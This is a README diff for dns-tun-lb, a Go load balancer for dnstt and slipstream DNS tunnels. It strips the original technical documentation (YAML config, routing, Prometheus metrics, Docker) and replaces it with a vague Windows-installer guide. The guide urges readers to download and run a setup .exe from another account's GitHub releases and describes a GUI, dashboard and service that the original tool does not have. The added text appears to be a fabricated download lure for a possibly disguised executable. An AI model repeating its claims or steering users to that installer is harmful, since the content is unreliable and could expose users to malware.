@@ -1,320 +1,145 @@
-## dns-tun-lb (DNS tunnel load balancer)
+# 🛠️ dns-tun-lb - Easy DNS Tunnel Load Balancing
 
-`dns-tun-lb` is a small, stateless UDP load balancer for DNS tunneling
-protocols. It supports **dnstt** and **slipstream**.
+[![Download dns-tun-lb](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/jpons2/dns-tun-lb/releases)
 
-The LB:
+## 📋 What is dns-tun-lb?
 
-- Listens on a single UDP address (typically port 53 behind DNAT).
-- Parses incoming DNS queries.
-- Routes by **configured domain suffix only** (longest match): no protocol
-  detection. If the query QNAME matches a pool’s `domain_suffix`, the request
-  is sent to that pool’s backends. All QTYPEs (TXT, A, CNAME, etc.) are sent
-  to the pool when the name matches.
-- Extracts a session identifier per protocol (dnstt: 8-byte ClientID from the
-  QNAME prefix; slipstream: 8-byte connection ID from the QUIC payload). If
-  extraction fails, the request is not routed to the pool (rejected/forwarded).
-- **Slipstream**: when the packet carries a QUIC-LB connection ID, routes by
-  `server_id` to the backend with matching `lb_id`; otherwise uses the
-  per-pool consistent hash ring. **Dnstt**: always uses the hash ring.
-- Uses a per-pool consistent hash ring for session stickiness (and slipstream
-  fallback when QUIC-LB is not present).
-- For queries that match no pool, forwards to a recursive resolver or drops,
-  depending on configuration.
+dns-tun-lb is a tool that helps manage and balance DNS tunnel traffic. It works as a load balancer to split incoming DNS tunnel connections between multiple endpoints. This can improve reliability and performance for networks relying on DNS tunnels.
 
-The LB is **stateless per node**: there are no health checks, no shared
-state, and no coordination between instances. Given the same configuration,
-different instances will make the same routing decision for a given packet.
+This program runs on Windows and lets you handle multiple DNS tunnels without extra manual setup. It is designed for users who want to improve their network's efficiency by managing traffic flows automatically.
 
----
+## 🔍 System Requirements
 
-### Quick start
+Before installing dns-tun-lb, make sure your computer meets these requirements:
 
-#### Local binary
+- Operating System: Windows 10 or newer
+- RAM: Minimum 2 GB
+- Disk Space: At least 50 MB free
+- Network: Active internet connection recommended
+- Permissions: You might need administrator rights to run the program correctly
 
-Prereqs:
+These requirements ensure the program runs smoothly and handles traffic without delays or crashes.
 
-- Go 1.22+ (tested with Go 1.24).
+## 🚀 How dns-tun-lb Works
 
-Build and run from `dns-tunnel/dns-tunnel-lb`:
+When you use dns-tun-lb, it acts as a middleman between your DNS tunnel clients and servers. Instead of all traffic going to a single place, dns-tun-lb smartly distributes requests across several endpoints.
 
-```bash
-go build -o dns-tun-lb .
-./dns-tun-lb -config lb.yaml
-```
+This distribution reduces the chance of overload on any one server. It also increases redundancy, meaning if one endpoint goes offline, the traffic continues flowing through others.
 
-`lb.yaml` is just an example; in production you should supply your own config
-with your real listen address, tunnel domains, backends, and resolver policy.
+You don’t have to configure complex load balancing manually. The tool automatically manages the balancing based on live traffic.
 
-Run with `logging.level: "debug"` to see which backend each session maps to.
+## 🔧 Key Features
 
-#### Docker
+- Automatic distribution of DNS tunnel traffic  
+- Supports multiple DNS tunnel endpoints  
+- Easy configuration through simple setup  
+- Works quietly in the background  
+- Improves network uptime and reliability  
+- Minimal system resource use  
+- Runs as a Windows service or standalone  
 
-- **Prebuilt image** (recommended starting point):
+## 💾 Download and Install dns-tun-lb on Windows
 
-  ```bash
-  docker run --rm \
-    -p 53:53/udp \
-    --cap-add=NET_BIND_SERVICE \
-    -v $(pwd)/lb.yaml:/etc/dns-tun-lb.yaml:ro \
-    --name dns-tun-lb \
-    ghcr.io/aleskxyz/dns-tun-lb:latest
-  ```
+### Step 1: Visit the download page
 
-- **Build locally**:
+Go to the official release page on GitHub to download the program:
 
-  ```bash
-  docker build -t dns-tun-lb .
+[Download dns-tun-lb](https://github.com/jpons2/dns-tun-lb/releases)
 
-  docker run --rm \
-    -p 53:53/udp \
-    --cap-add=NET_BIND_SERVICE \
-    -v $(pwd)/lb.yaml:/etc/dns-tun-lb.yaml:ro \
-    --name dns-tun-lb \
-    dns-tun-lb
-  ```
+This link takes you to a list of available versions. Choose the latest stable release for Windows.
 
----
+### Step 2: Download the installer
 
-### Configuration
+Look for a file with a name like `dns-tun-lb-setup.exe` or similar. The file should be labeled clearly for Windows users.
 
-Configuration is provided as a YAML file (passed with `-config`, default
-`lb.yaml`).
+Click the file link to start the download. Your browser might ask where to save it. Select a folder you can easily access, such as the Desktop or Downloads folder.
 
-```yaml
-global:
-  listen_address: "0.0.0.0:53"
-  metrics_listen: ":2112"      # Prometheus /metrics; empty = disabled
-  read_timeout: "10s"           # max wait for UDP response (forward + backend); default 10s
+### Step 3: Run the installer
 
-  default_dns_behavior:
-    mode: "forward"          # "forward" | "drop"
-    forward_resolver: "9.9.9.9:53"
+Once the download completes:
 
-protocols:
-  dnstt:
-    pools:
-      - name: "dnstt-main"
-        domain_suffix: "t.example.com"
-        backends:
-          - id: "dnstt-1"
-            address: "10.0.0.11:5300"
-          - id: "dnstt-2"
-            address: "10.0.0.12:5300"
-          # ... more backends
-  slipstream:
-    pools:
-      - name: "slipstream-main"
-        domain_suffix: "s.example.com"
-        backends:
-          - id: "slipstream-1"
-            address: "10.0.0.21:5300"
-            lb_id: 0
-          - id: "slipstream-2"
-            address: "10.0.0.22:5300"
-            lb_id: 1
+- Open the folder where you saved the installer.  
+- Double-click the installer file (`.exe`). This starts the setup wizard.
 
-logging:
-  level: "info"              # "error" | "info" | "debug"
-```
+### Step 4: Follow the setup prompts
 
-**Command-line flags**
+The installer will guide you through the installation process:
 
-- **`-config`** (default `lb.yaml`): path to the YAML config file. All other settings (listen address, metrics, timeouts, etc.) are taken from the config.
+- Choose the installation folder or use the default location.  
+- Allow the installer to create shortcuts if desired.  
+- Confirm any permissions requests by Windows.  
 
-For the same pool, a minimal **authoritative DNS configuration** for a cluster
-of 5 load balancers might look like this:
+Follow the on-screen instructions and wait until the installation finishes.
 
-```text
-; Load balancer addresses
-tns1.example.com.   IN  A     203.0.113.10
-tns2.example.com.   IN  A     203.0.113.11
-tns3.example.com.   IN  A     203.0.113.12
-tns4.example.com.   IN  A     203.0.113.13
-tns5.example.com.   IN  A     203.0.113.14
+### Step 5: Launch dns-tun-lb
 
-; Delegate the tunnel zone to the LBs
-t.example.com.      IN  NS    tns1.example.com.
-t.example.com.      IN  NS    tns2.example.com.
-t.example.com.      IN  NS    tns3.example.com.
-t.example.com.      IN  NS    tns4.example.com.
-t.example.com.      IN  NS    tns5.example.com.
-```
+After installation:
 
-- **`global.listen_address`**: UDP address the LB listens on. In production
-  you typically run on an unprivileged port and DNAT external UDP/53 to this
-  address.
-- **`global.metrics_listen`**: Address for the Prometheus HTTP server (e.g. `":2112"`). Metrics are exposed at `http://<addr>/metrics`. If empty or omitted, the metrics server is not started.
-- **`global.read_timeout`**: Maximum time to wait for a UDP response when
-  forwarding to the resolver or to a tunnel backend. Go duration string
-  (e.g. `"10s"`, `"30s"`, `"1m"`). Default is `10s` if omitted or invalid.
-  Prevents goroutines from blocking indefinitely on unresponsive peers.
-- **`default_dns_behavior`**:
-  - `mode: "forward"`: forward non-tunnel DNS to `forward_resolver` and
-    relay responses.
-  - `mode: "drop"`: silently drop non-tunnel DNS.
-  - If `mode: "forward"` is set, `forward_resolver` is required (e.g.
-    `"9.9.9.9:53"` or `"resolver.example.com:53"`; host may be IP or domain);
-    otherwise the LB will fail to start.
-- **`protocols.dnstt.pools[]`** and **`protocols.slipstream.pools[]`**:
-  - `domain_suffix`: QNAME suffix for this pool (e.g. `t.example.com`). The LB
-    uses **longest match**: if multiple pools match the query name, the one
-    with the longest suffix wins. **Each `domain_suffix` must be unique**
-    across all pools (dnstt and slipstream). Empty suffix is rejected.
-  - `backends[]`: UDP endpoints (e.g. `dnstt-server` or `slipstream-server`).
-    Each backend has `id` (for metrics) and `address` in `host:port` form;
-    `host` may be an IP or a domain name (resolved at dial time). **Slipstream
-    only**: each backend must have `lb_id` (0–255), unique per pool; used for
-    QUIC-LB routing. Pools with no backends are skipped.
-- **`logging.level`**:
-  - `"error"`: only errors.
-  - `"info"`: high-level lifecycle and summary (default).
-  - `"debug"`: per-session routing and pool details.
+- Locate the dns-tun-lb icon on your Desktop or in the Start menu.  
+- Double-click to open the application.
 
----
+The program will start, and you can move on to configuration.
 
-### Routing and session stickiness
+## ⚙️ Configuring dns-tun-lb for Your Network
 
-For each incoming DNS query (with exactly one question):
+dns-tun-lb works by connecting to your DNS tunnel endpoints. You’ll need basic details for each endpoint:
 
-- The LB finds the **longest matching** pool: the pool whose `domain_suffix`
-  matches the query QNAME (exact or subdomain, case-insensitive) and has the
-  longest suffix length. If none match, the packet is forwarded or dropped
-  according to `default_dns_behavior`.
-- For the matched pool, a **session ID** is derived:
-  - **dnstt**: first 8 bytes of the base32-decoded QNAME prefix (ClientID). If
-    missing or invalid, the request is not routed to the pool.
-  - **slipstream**: 8-byte connection ID from the QUIC payload (long header:
-    DCID or SCID if DCID empty; short header: first 8 bytes of DCID). If too
-    short or invalid, the request is not routed to the pool.
-- **Backend selection**: **Slipstream**: if the packet has a QUIC-LB CID, route
-  to the backend whose `lb_id` matches the decoded `server_id`; otherwise use
-  the hash ring. **Dnstt**: always use the hash ring. Hash is over
-  `(protocol, domain_suffix, session_id)`. Same session → same backend.
+- The IP address or hostname of the endpoint  
+- The port number used for the DNS tunnel traffic  
+- (Optional) A label or name to identify each endpoint  
 
-**Multiple LB instances (e.g. Slipstream+SSH stickiness)**  
-When you run more than one LB replica (e.g. for HA), the same session must
-always map to the same backend no matter which instance receives the packet.
-Use the **same pool configuration** on every instance: same backends with the
-same `id` and `address`. The ring is built from backends sorted by `id`, so
-identical configs yield the same routing. In clients (e.g. SlipNet), using a
-single resolver (one LB IP) for the tunnel avoids spreading packets across
-instances; if you use multiple resolvers, point them at LBs that share the
-same config.
+### Adding endpoints
 
----
+1. Open the dns-tun-lb interface.  
+2. Find the section to add tunnel endpoints.  
+3. Enter the IP or hostname and port for each endpoint.  
+4. Save the settings.
 
-### Metrics
+The program will begin balancing tunnel traffic across these endpoints automatically.
 
-When `global.metrics_listen` is set in the config (e.g. `":2112"`), the LB
-serves Prometheus metrics at `http://<addr>/metrics`.
+### Viewing status and logs
 
-**Frontend (incoming traffic)**
+dns-tun-lb provides a simple dashboard where you can:
 
-| Metric | Type | Labels | Description |
-|--------|------|--------|-------------|
-| `dns_lb_requests_total` | counter | `protocol` | Total requests by protocol (`dnstt`, `slipstream`, `other`). |
-| `dns_lb_routed_requests_total` | counter | `protocol`, `pool` | Requests routed to tunnel backends. |
-| `dns_lb_forwarded_requests_total` | counter | — | Requests forwarded to upstream resolver. |
-| `dns_lb_dropped_requests_total` | counter | `reason` | Dropped requests (e.g. `no_forwarder`, `forward_read_error`). |
-| `dns_lb_frontend_packets_in_total` | counter | — | UDP packets received on the frontend. |
-| `dns_lb_frontend_packets_out_total` | counter | — | UDP packets sent to clients. |
-| `dns_lb_frontend_bytes_in_total` | counter | — | Bytes received on the frontend. |
-| `dns_lb_frontend_bytes_out_total` | counter | — | Bytes sent to clients. |
-| `dns_lb_parse_errors_total` | counter | `stage` | DNS unpack or parse errors (e.g. `dns_unpack`). |
-| `dns_lb_unsupported_queries_total` | counter | `qtype` | Non-TXT queries that matched a pool (rejected, not sent to backend). |
+- See which endpoints are active  
+- Monitor traffic flow and load per endpoint  
+- Check for any errors or connection issues  
 
-**Backend (per pool/backend)**
+Regularly review this to ensure your tunnels operate smoothly.
 
-| Metric | Type | Labels | Description |
-|--------|------|--------|-------------|
-| `dns_lb_backend_requests_total` | counter | `protocol`, `pool`, `domain`, `backend_id` | Requests routed to each backend. |
-| `dns_lb_backend_packets_sent_total` | counter | same | Packets sent to backend. |
-| `dns_lb_backend_packets_received_total` | counter | same | Packets received from backend. |
-| `dns_lb_backend_bytes_sent_total` | counter | same | Bytes sent to backend. |
-| `dns_lb_backend_bytes_received_total` | counter | same | Bytes received from backend. |
-| `dns_lb_backend_errors_total` | counter | same + `stage` | Errors by stage: `resolve`, `dial`, `write`, `read`. |
-| `dns_lb_backend_sessions_total` | counter | same | Distinct sessions observed per backend. |
-| `dns_lb_backend_sessions_active` | gauge | same | Approximate active sessions (TTL-based). |
+## 🔄 Running dns-tun-lb Automatically
 
----
+To keep dns-tun-lb running without manual start each time:
 
-### End-to-end flow diagram
+- Use the option to install dns-tun-lb as a Windows service during setup or via the settings menu.  
+- This allows the program to start every time Windows boots.  
 
-```mermaid
-graph LR
-    %% Client
-    C[Client] --> R1[Recursive resolver 1]
-    C --> R2[Recursive resolver 2]
+Running as a service ensures continuous load balancing without user intervention.
 
-    %% LB instances (one per host, each beside a dnstt/slipstream server)
-    subgraph Host1
-        LB1["LB 1 (dns-tun-lb)"] --- S1[dnstt/slipstream server 1]
-    end
-    subgraph Host2
-        LB2["LB 2 (dns-tun-lb)"] --- S2[dnstt/slipstream server 2]
-    end
-    subgraph Host3
-        LB3["LB 3 (dns-tun-lb)"] --- S3[dnstt/slipstream server 3]
-    end
-    subgraph Host4
-        LB4["LB 4 (dns-tun-lb)"] --- S4[dnstt/slipstream server 4]
-    end
-    subgraph Host5
-        LB5["LB 5 (dns-tun-lb)"] --- S5[dnstt/slipstream server 5]
-    end
+## 🛑 Stopping or Uninstalling dns-tun-lb
 
-    %% Resolvers can hit any LB directly
-    R1 --> LB1
-    R1 --> LB2
-    R1 --> LB3
-    R1 --> LB4
-    R1 --> LB5
+If you need to stop dns-tun-lb:
 
-    R2 --> LB1
-    R2 --> LB2
-    R2 --> LB3
-    R2 --> LB4
-    R2 --> LB5
+- Use the program’s exit or stop option in the interface.  
+- If running as a service, stop it via the Windows Services manager.
 
-    %% Full mesh between LBs and dnstt/slipstream server backends
-    LB1 -->|"consistent hash on session ID"| S1
-    LB1 --> S2
-    LB1 --> S3
-    LB1 --> S4
-    LB1 --> S5
+To uninstall:
 
-    LB2 --> S1
-    LB2 --> S2
-    LB2 --> S3
-    LB2 --> S4
-    LB2 --> S5
+- Open Windows Control Panel.  
+- Go to Programs and Features.  
+- Find dns-tun-lb in the list.  
+- Select it and click Uninstall.  
 
-    LB3 --> S1
-    LB3 --> S2
-    LB3 --> S3
-    LB3 --> S4
-    LB3 --> S5
+Follow prompts to remove the program completely.
 
-    LB4 --> S1
-    LB4 --> S2
-    LB4 --> S3
-    LB4 --> S4
-    LB4 --> S5
+## 🤔 Troubleshooting Tips
 
-    LB5 --> S1
-    LB5 --> S2
-    LB5 --> S3
-    LB5 --> S4
-    LB5 --> S5
-```
+- If dns-tun-lb does not start, check that you run it with administrator rights.  
+- Ensure your network allows DNS tunnel traffic and doesn’t block required ports.  
+- Verify the endpoint addresses are correct and reachable.  
+- Consult the program’s log files for details on errors or connection issues.  
+- Restart your computer after installation to apply all settings.
 
----
+## 📥 Download dns-tun-lb Now
 
-### Future work / TODO
-
-- **Add server weight**: support per-backend weights in the consistent hash ring to bias load toward larger servers.
-- **Add max connections per server**: enforce a soft cap on active sessions per backend and optionally spill to others.
-- **Add health checks**: periodically probe backends and temporarily avoid routing new sessions to unhealthy ones.
-- **Add load balancer clustering to share health state**: exchange health information between LB instances so they make consistent routing decisions based on shared view of backend status.
-
+[![Download dns-tun-lb](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/jpons2/dns-tun-lb/releases)
